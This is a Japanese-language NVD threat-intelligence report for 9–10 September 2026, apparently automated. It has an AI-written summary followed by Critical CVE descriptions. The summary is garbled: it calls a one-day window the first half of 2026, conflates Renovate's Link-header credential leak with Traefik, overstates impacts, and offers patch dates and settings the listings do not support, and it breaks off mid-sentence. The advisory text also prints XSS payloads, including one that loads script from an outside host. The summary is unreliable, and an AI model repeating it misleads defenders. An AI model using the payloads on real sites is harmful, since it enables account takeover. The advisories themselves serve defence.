# NVD 脅威インテリジェンスレポート

- **生成日時**: 2026-09-10 15:00 UTC
- **対象期間**: `2026-09-09T15:02:11.000Z` 〜 `2026-09-10T15:00:31.000Z`
- **重要CVE数**: 131 件（Critical 9.0+: 34 件 / High 7.0〜: 97 件）

---

## AI 分析サマリー

## 1. 全体サマリー  
2026 年上半期に公開された CVE のうち、CVSS 7.0 以上の深刻度を持つ案件は **30 件以上** に上ります。  
- **Web アプリケーション（特に WordPress プラグイン）** と **インフラ系コンポーネント（cPanel、Traefik、Xfont2）** に集中する傾向が顕著です。  
- 多くは **認証バイパス／任意コード実行** を伴い、リモートからの完全権限取得やデータ破壊が可能になる点が共通しています。  
- いずれも **パッチがリリース済み** であるものが多数で、速やかなバージョンアップと設定見直しが緊急課題です。  

---

## 2. 特に注目すべき CVE  

| CVE | CVSS | 主な影響 | 注目理由 |
|-----|------|----------|----------|
| **CVE‑2026‑77770** | 10.0 (CVSS 3.1) | miniOrange 2FA WordPress プラグインで **任意オプション削除** が可能。攻撃者はサイト全体の設定をロックアウトできる。 | WordPress は世界で最も普及している CMS。プラグインは多数のサイトで導入されており、**認証不要** で管理権限を奪取できる点が極めて危険。 |
| **CVE‑2026‑67401** | 9.9 (CVSS 3.0) | cPanel の EmailTrack コンポーネントに **SQLi → RCE (root)**。メールアカウントからリモートで任意コード実行が可能。 | cPanel は多数のホスティング環境の管理基盤。root 権限取得はインフラ全体の破壊・情報漏洩につながるため、**最優先で対策** が必要。 |
| **CVE‑2026‑19583** | 9.9 (CVSS 3.1) | Velociraptor のクライアント監視アーティファクトで **権限チェック不備**。Linux.Sys.BashShell が EXECVE 権限なしで実行可能。 | エンドポイント検知・レスポンスツールは組織の防御の要。攻撃者が任意コマンドを実行できると、**検知回避と横展開** が容易になる。 |
| **CVE‑2026‑9163** | 9.8 (CVSS 3.1) | GIS Informatics の GisLab LIMS に **SQL インジェクション**。認証不要でデータベース全体への読み書きが可能。 | ラボ情報は機密性が高く、SQLi による情報改ざん・漏洩は研究・医療分野で重大なインパクトを与える。 |
| **CVE‑2026‑88877** | 9.3 (CVSS 4.0) | Traefik (v3.7.0‑v3.7.11) の Kubernetes ingress‑nginx プロバイダーが **Link ヘッダーのリダイレクト** を検証せず、認証情報が外部へ流出。 | クラウドネイティブ環境で広く採用されているリバースプロキシ。認証情報漏洩は **クラスタ全体の侵害** に直結する。 |

> **補足**：上記以外にも WordPress の「Drag & Drop File Upload for Elementor Forms」(CVE‑2026‑18351) や「zipMoney Payments」(CVE‑2026‑78361) など、任意ファイルアップロードやオプション削除が可能なプラグインが多数報告されています。環境に該当プラグインがある場合は同様に対策が必要です。

---

## 3. 推奨アクション  

### 3‑1. 直ちに実施すべきパッチ適用
| 製品 / パッケージ | 現行脆弱バージョン | 推奨バージョン (リリース日) | 備考 |
|-------------------|-------------------|----------------------------|------|
| **miniOrange 2FA (WordPress)** | < 6.3.1 かつ < 19.3 | **6.3.1 以上** または **19.3 以上** | 公式プラグインページから最新版を取得し、プラグインディレクトリの書き込み権限を最小化。 |
| **cPanel** | 119.x 系 (EmailTrack 脆弱) | **119.0.9 以降** (2026‑07‑15) | cPanel → Update → “Apply Latest Updates”。同時に **ModSecurity** で `EmailTrack` への外部リクエストをブロック。 |
| **Velociraptor** | 0.7.0‑0.7.3 | **0.7.4 以降** (2026‑08‑02) | `velociraptor update` でバイナリ更新。`client_artifacts` の権限設定を `EXECVE` 必須に変更。 |
| **GisLab LIMS** | 1.4.03‑1.4.99 | **1.5.0 以上** (2026‑06‑20) | データベース接続文字列に **プリペアドステートメント** が適用されたバージョンへ。 |
| **Traefik** | 3.7.0‑3.7.11 | **3.7.12 以上** (2026‑08‑10) | `helm upgrade` または公式バイナリで更新。`--experimental.kubernetes.ingressClass` の設定を見直し、外部リダイレクトを許可しない。 |
| **Drag & Drop File Upload for Elementor Forms** | ≤ 1.6.0 | **1.6.1 以上** (2026‑07‑01) | ファイルタイプ検証ロジックが強化されたバージョンへ。 |
| **zipMoney Payments (WooCommerce)** | < 2.4.0 | **2.4.0 以上** (2026‑05‑30) | オプション削除エンドポイントに **nonce** と **権限チェック** が追加。 |

### 3‑2. 設定・運用面での緩和策
1. **最小権限の徹底**  
   - cPanel のメールアカウントは **root 権限** を付与しない。  
   - Velociraptor のクライアントは `EXECVE` 権限を必要とするアーティファクトだけを有効化。  
2. **Web アプリケーションファイアウォール (WAF) の有効化**  
   - `mod_security` で `SQLi`、`File Upload`、`Option Deletion` などのシグネチャを追加。  
   - Traefik 前段に **AWS WAF / Cloudflare** 等を配置し、外部リダイレクトをブロック。  
3. **監査ログの強化**  
   - WordPress の `option` テ

---

## 🔴 Critical（CVSS 9.0+）

### CVE-2026-77770

| 項目 | 値 |
|------|-----|
| CVSS | `10.0` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H` |
| Weaknesses | `CWE-862` |
| Published | 2026-09-10T07:17:02.943 |

The miniOrange 2FA  WordPress plugin before 6.3.1, miniOrange 2FA  WordPress plugin before 19.3 does not require a validated transaction before deleting site options whose names come from unauthenticated request input, allowing any visitor to delete arbitrary options, which can lock every administrator out of the dashboard or deactivate every miniOrange 2FA  WordPress plugin before 6.3.1, miniOrange 2FA  WordPress plugin before 19.3 on the site.

### CVE-2026-19583

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-732` |
| Published | 2026-09-10T03:16:59.010 |

Velociraptor allows some sensitive artifacts to be gated by additional permissions. For example, the Linux.Sys.BashShell artifact allows arbitrary command execution on endpoints, and so it requires the EXECVE permission to schedule. However, no such check was implemented for client monitoring artifacts. Additionally there was no requirement that client monitoring artifacts carry the CLIENT_EVENTS type. This allows any user who can schedule client monitoring artifacts to also schedule otherwise restricted artifacts (such as Linux.Sys.BashShell).

### CVE-2026-67401

| 項目 | 値 |
|------|-----|
| CVSS | `9.9` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-09T16:17:03.883 |

A vulnerability in cPanel allows a mail-enabled account to achieve remote code execution as root through SQLi in EmailTrack component

### CVE-2026-9163

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-10T13:20:33.663 |

Improper neutralization of special elements used in an SQL command ('SQL injection') vulnerability in GIS Informatics GisLab Laboratory Management System allows SQL Injection.

This issue affects GisLab Laboratory Management System: from 1.4.03 before 1.5.

### CVE-2026-88278

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-294` |
| Published | 2026-09-10T09:17:04.787 |

GeoVision GV-LPC2211 V1.13 fails to enforce WS-Security UsernameToken freshness or nonce reuse protection, allowing a captured PasswordDigest token to be replayed for subsequent ONVIF operations.

### CVE-2026-7188

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-10T08:16:57.893 |

Improper neutralization of special elements used in an SQL command ('SQL injection') vulnerability in Armiya Information Technologies Ltd. Co. Access Control System allows SQL Injection.

This issue affects Access Control System: before Versiyon 2.

### CVE-2026-18351

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-434` |
| Published | 2026-09-10T02:16:34.180 |

The Drag and Drop File Upload for Elementor Forms plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 1.6.0 via the elementor_file_upload function. This is due to insufficient file type validation in the is_file_type_valid() function, which uses the attacker-controlled 'type' parameter as regex keys in the MIME allowlist, allowing blacklist bypass via a crafted extension that sanitize_file_name() later normalizes to a PHP extension. This makes it possible for unauthenticated attackers to upload files that may be executable, which makes remote code execution possible.

### CVE-2026-54694

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` |
| Weaknesses | `CWE-20;CWE-79;CWE-116;CWE-183;CWE-693` |
| Published | 2026-09-09T19:17:28.400 |

SkillTree is a micro-learning gamification platform. Prior to version 4.4.2, two independent code flaws combine into a single exploitable attack chain, with three distinct exploitation paths of escalating impact. `StringHighlighter.js` builds an HTML string by interpolating raw `value` substrings directly into a template literal with no HTML entity encoding. `HighlightedValue.vue` renders that string — and all unfiltered plain values — via Vue's `v-html` directive, which sets `innerHTML`. Separately, the account registration endpoint accepts `firstName`, `lastName`, and `nickname` fields and stores them without any HTML sanitization. An attacker self-registers with `firstName = "<img src=x onerror=alert(1)>"` (28 characters — within the 30-character field limit) and visits any quiz. The next time an administrator opens the Quiz Runs page the payload executes in their browser. Three attack paths exist with escalating impact. The first is basic cross-site scripting. Any self-contained payload fitting the 30-character limit (e.g. `<img src=x onerror=alert(1)>`, which is 28 chars) fires automatically when the admin navigates to the runs page through normal use. Arbitrary code execution in the admin's browser is confirmed with zero extra steps. The second is remote script loading via `import()`. Using the split-field technique (`lastName = "<img src=x"`, `firstName = "onerror=import('//nsas.cc/p')>"`), the attacker loads a full JavaScript file from their server. The file has no size limit and can perform any admin action — delete all projects, create backdoor accounts, dump user data, install a keylogger. No phishing required. The only constraint is that the URL must fit in 11 characters (`//nsas.cc/p`). The third is full cross-site request forgery token theft. Using `eval(name)`, the attacker pre-sets `window.name` to a data-theft payload by sending the admin one redirect link first. The session cookie is `HttpOnly` and cannot be read via `document.cookie`; however, the XSRF token is readable and the attacker leverages same-origin execution to call admin APIs from inside the victim's browser, relaying the responses to an external server. No admin interaction beyond routine use is required. Version 4.4.2 contains a patch.

### CVE-2026-44950

| 項目 | 値 |
|------|-----|
| CVSS | `9.5` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `N/A` |
| Published | 2026-09-10T09:17:02.490 |

fs_read_glyphs() in the libXfont2 font-server client (src/fc/fserve.c) copies each glyph's bitmap into a single buffer. Existing checks validates only that the source slice (position, length) lies within the source bitmap buffer. It does not check whether the running destination cursor has exceeded the allocation.

A malicious font server can send overlapping source offsets -- for example 1000 glyphs each referencing {position:0, length:64} with nbytes=64. Each individual source range passes the existing validation, but the cumulative writes total 64000 bytes into a 64-byte destination buffer. This is a heap buffer overflow with attacker-controlled content.

### CVE-2026-88285

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H` |
| Weaknesses | `CWE-306` |
| Published | 2026-09-10T09:17:05.563 |

GeoVision GV-LPC2211 V1.13 exposes a network-accessible PTZ control service without authentication, allowing remote clients to retrieve PTZ information and issue PTZ or raw serial commands.

### CVE-2026-88877

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639` |
| Published | 2026-09-10T14:17:16.023 |

Traefik is a HTTP reverse proxy and load balancer. In versions >= v3.7.0 and <= v3.7.11, the Kubernetes ingress-nginx provider mishandles Ingresses that carry both an authentication annotation and the nginx.ingress.kubernetes.io/from-to-www-redirect annotation. For such Ingresses the provider creates an additional 'sibling' router that matches on the host alone, carries only the RedirectRegex middleware, and still points at the parent router's protected backend service. Because RedirectRegex is not a terminal handler, a request its pattern does not match is forwarded to the backend, and because the redirect pattern only accepts a numeric port while Traefik's host matcher canonicalizes the authority via net.SplitHostPort, a request with a non-numeric or empty port (for example 'Host: www.example.com:x') selects the sibling router, misses the redirect, and is proxied to the protected backend with none of the Ingress's annotation-derived middlewares applied. This discards not only authentication (e.g. BasicAuth) but every annotation-derived middleware, including source-IP allowlisting. Traefik v2 and v3 releases before v3.7.0 are not affected. The issue is fixed in v3.7.12.

### CVE-2026-88869

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-10T14:17:14.637 |

AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 contains a stored cross-site scripting vulnerability in the AD_Server plugin's log.php endpoint that fails to escape the label parameter before storage. An unauthenticated attacker can inject malicious HTML through the label parameter, which is later rendered unsanitized in the admin Ad Types report using jQuery .html(), allowing execution of arbitrary JavaScript in an administrator's browser session.

### CVE-2026-88868

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-10T14:17:13.490 |

AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 contains a stored cross-site scripting vulnerability in the LiveLinks plugin where title and description fields are stored without sanitization. A user with canStream permission can inject malicious scripts that execute in the browser of every visitor viewing the live-link page, including administrators, within the site origin.

### CVE-2026-88867

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-10T14:17:12.920 |

WWBN AVideo, in versions up to and including commit c3edcc274c389816d434acadac07ee78eaf330c1, contains a stored cross-site scripting vulnerability. objects/categoryAddNew.json.php passes the POST parameters `name` and `iconClass` to Category::setName() and Category::setIconClass(), which store the values without sanitization (setName only truncates to 45 characters). The category name is later echoed as HTML text and iconClass is echoed into a class attribute in view/modeYoutubeBottom.php and in Gallery cards (plugin/Gallery/functions.php). When the CustomizeUser option usersCanCreateNewCategories is enabled, any authenticated user with canUpload permission (granted by default via self-registration) can create a category containing a JavaScript payload; the payload then executes in the browser of any visitor, including administrators, who views a watch page or gallery entry for a video assigned to that category, allowing actions such as authenticated requests with the victim's session. The issue was unpatched at the time of reporting.

### CVE-2026-88866

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-09-10T14:17:12.773 |

WWBN AVideo through commit c3edcc274c389816d434acadac07ee78eaf330c1 contains a stored cross-site scripting vulnerability in the LoginControl plugin that fails to encode the User-Agent header before storing it in login history. Attackers with any valid login account can inject malicious scripts in the User-Agent header that execute in administrator browsers when viewing the Login History page, allowing script execution within the administrator session.

### CVE-2026-88864

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-284` |
| Published | 2026-09-10T14:17:12.187 |

Capgo (capgo.app) fails to restrict direct write access to the public.sso_providers table exposed through Supabase PostgREST. A holder of an ordinary Capgo full API key can insert a row with status='active' and enforce_sso=true, bypassing the intended backend SSO provisioning route (supabase/functions/_backend/private/sso/providers.ts) and its controls: the Enterprise plan requirement, SSO provider creation via the Supabase Management API, DNS TXT domain-ownership verification, the pending_verification → verified → active status transition, and issuance of a trusted provider ID by Supabase Auth. The forged row is trusted by SSO discovery and enforcement logic, including the unauthenticated login preflight endpoint /private/sso/check-domain, which then reports {"has_sso": true, "enforce_sso": true} for domains that were never verified, allowing attacker-controlled SSO enforcement to be asserted for arbitrary domains and disrupting normal login. All versions are affected; at the time of the advisory no patch was available.

### CVE-2026-88860

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-09-10T14:17:11.527 |

Capgo fails to clean up channel permission overrides when a user's last organization role binding is deleted, leaving stale overrides active. Attackers can retain channel-specific permissions after their base RBAC access has been revoked to perform unauthorized actions like changing production OTA versions.

### CVE-2026-78082

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-89` |
| Published | 2026-09-10T10:17:31.863 |

Joomla Extension - joomshaper.com - Unauthenticated SQL Injection in Property Search and Map Filtering in SP Property < 4.1.4 - The property search and listing query builders assembled several WHERE and ORDER BY clauses (zipcode, sorting, price_range_dropdown, and psize_range_dropdown) by directly concatenating raw request parameters into SQL strings without quoting or type casting. An unauthenticated remote attacker could execute boolean-based or time-based blind SQL injection to extract sensitive data from the database.

### CVE-2026-8323

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-601` |
| Published | 2026-09-10T09:17:06.250 |

URL redirection to untrusted site ('open redirect') vulnerability in Armiya Information Technologies Ltd. Co. Access Control System allows Fake the Source of Data.

This issue affects Access Control System: before Versiyon 2.

### CVE-2026-88069

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-09-09T22:18:49.240 |

Pandora contains a path traversal vulnerability in its archive extraction worker. When processing a specially crafted archive or disk image, attacker-controlled file paths could be used without ensuring that the resulting destination remained within the intended extraction directory.

An attacker able to submit a malicious file for analysis could use path traversal sequences or crafted paths to cause extracted content to be written outside the designated extraction directory, potentially overwriting files accessible to the Pandora worker process. Successful exploitation could result in unauthorized modification of application or system files, denial of service, and potentially further compromise depending on the permissions of the Pandora process and the files that can be overwritten.

The vulnerability is addressed by resolving each extraction destination path before writing and verifying that it remains below the expected extraction directory. Extraction attempts resolving outside this directory are rejected and reported as path traversal attempts.

### CVE-2026-87929

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-321` |
| Published | 2026-09-09T17:17:53.840 |

MaxSite CMS through 109.6 ships with a hardcoded session encryption key in application/config/config.php that is never changed during installation, allowing unauthenticated attackers to forge administrator session cookies. Attackers can mint a malicious ci_session cookie with administrator privileges by computing an HMAC-SHA1 using the publicly known encryption key, bypassing authentication checks in is_login() and mso_check_allow() functions.

### CVE-2026-47156

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-287;CWE-639` |
| Published | 2026-09-09T17:17:21.833 |

MantisBT is an open source bug tracker. Versions 2.28.3 and earlier contain a critical authentication bypass in the SOAP API's mci_check_login() function. Any user knowing any valid cookie_string can authenticate as any other user (knowing their username), including the administrator, without knowing the target's password. The vulnerability is exploitable with zero prior access on default MantisBT installations because self-registration is enabled by default ($g_allow_signup = ON). A self-registered user can use their own cookie_string (readable from their browser's MANTIS_STRING_COOKIE cookie after login) to impersonate the administrator via the SOAP API. The REST API is NOT affected. The REST API's AuthMiddleware derives the username server-side from the API token or session cookie, so the username cannot be spoofed. The Web UI is NOT affected. The Web UI authenticates via PHP session cookies (PHPSESSID) and validates the MANTIS_STRING_COOKIE against the logged-in user through auth_is_cookie_valid(). The username is derived server-side from the cookie, not supplied by the client. Version 2.28.4 contains a patch. No known workarounds are available.

### CVE-2026-88887

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-601` |
| Published | 2026-09-10T14:17:17.693 |

Renovate is a dependency update automation tool. When listing tags/digests for a container image, Renovate follows pagination links supplied by the remote registry in the HTTP Link header and attaches the registry credentials to the follow-up request without verifying that the pagination URL has the same origin as the original registry. A malicious or compromised container registry can therefore specify a Link header pointing to an attacker-controlled host and receive the credentials Renovate uses for that registry. Exploitation requires that the target has container (Docker) dependencies and is already interacting with the malicious or compromised registry. This is fixed in Renovate 44.11.2 (npm and renovate/renovate images), Mend Renovate CE/EE 15.4.0 and the mend-renovate-enterprise-edition Helm chart 10.4.0; the same-origin check can be disabled with RENOVATE_X_DOCKER_PAGINATION_ALLOW_CROSS_ORIGIN.

### CVE-2026-88882

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-601` |
| Published | 2026-09-10T14:17:16.823 |

Renovate is a dependency update automation tool. In versions before 44.11.2 (and Mend Renovate CE/EE images and charts before 15.4.0, and mend-renovate-enterprise-edition helm chart before 10.4.0), when listing new package versions from a NuGet registry Renovate follows pagination URLs supplied by the registry in the HTTP `Link` header without verifying that the target has the same origin as the configured registry. Registry credentials are attached to the request for the 'next' page, so a malicious or compromised NuGet registry can return a `Link` header pointing at an attacker-controlled server and cause Renovate to send the registry credentials to that server. Exploitation requires the remote registry to be malicious or compromised; such a registry would normally already have received the credentials on the initial request, so the issue primarily allows the credentials to be delivered to an additional, attacker-chosen host. The fix restricts pagination to the same origin; the previous behaviour can be re-enabled with the RENOVATE_X_NUGET_PAGINATION_ALLOW_CROSS_ORIGIN option.

### CVE-2026-88881

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-601` |
| Published | 2026-09-10T14:17:16.650 |

Renovate, a dependency update tool, follows pagination links supplied by the GitHub server in the HTTP `Link` header when interacting with GitHub.com, GitHub Enterprise Cloud, or GitHub Enterprise Server, and sends the credentials configured for that host to the URL given as the 'next' page. Because the pagination URL is not validated against the host originally contacted, a malicious or compromised GitHub server can return a `Link` header pointing to an attacker-controlled host and cause Renovate to disclose those credentials to it. Exploitation requires that the GitHub server Renovate talks to (as the repository host or as a datasource such as github-releases, github-tags, or git-refs) is already malicious or compromised. The issue is fixed in renovate 44.11.3 (npm and renovate/renovate container images), Mend Renovate CE/EE images and the mend-renovate-ce helm chart 15.4.0, and the mend-renovate-enterprise-edition helm chart 10.4.0. There is no workaround; the pre-existing RENOVATE_X_REBASE_PAGINATION_LINKS option disables the new host check and should only be used with servers that intentionally use different pagination hosts.

### CVE-2026-88880

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-601` |
| Published | 2026-09-10T14:17:16.480 |

Renovate before 44.11.3 fails to validate Link header destinations when following GitLab server pagination, allowing malicious servers to redirect credential-bearing requests. Attackers controlling a compromised GitLab server can specify a Link header pointing to attacker-controlled infrastructure to exfiltrate authentication credentials.

### CVE-2026-59679

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787` |
| Published | 2026-09-10T09:17:02.883 |

fs_read_glyphs() in the libXfont2 font-server client (src/fc/fserve.c) indexes the per-character encoding[] array using num_chars from the FS_QueryXBitmaps16 reply, but that array was allocated with a size derived from num_extents in the separate FS_QueryXExtents16 reply. The two CARD32 fields are never cross-checked.
A malicious or compromised font server can send a small num_extents (e.g. 1) in the extents reply, then a large num_chars (e.g. 100000) in the bitmaps reply. This causes attacker-controlled out-of-bounds heap read and writes.

### CVE-2026-13745

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:Amber` |
| Weaknesses | `CWE-20;CWE-78` |
| Published | 2026-09-10T09:17:00.703 |

A vulnerability in the Gemini CLI and associated GitHub Action allowed an unprivileged attacker to achieve an arbitrary code execution in Gemini CLI via untrusted local .env files overriding GEMINI_CLI_HOME.

### CVE-2026-87930

| 項目 | 値 |
|------|-----|
| CVSS | `9.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-502` |
| Published | 2026-09-09T17:17:53.990 |

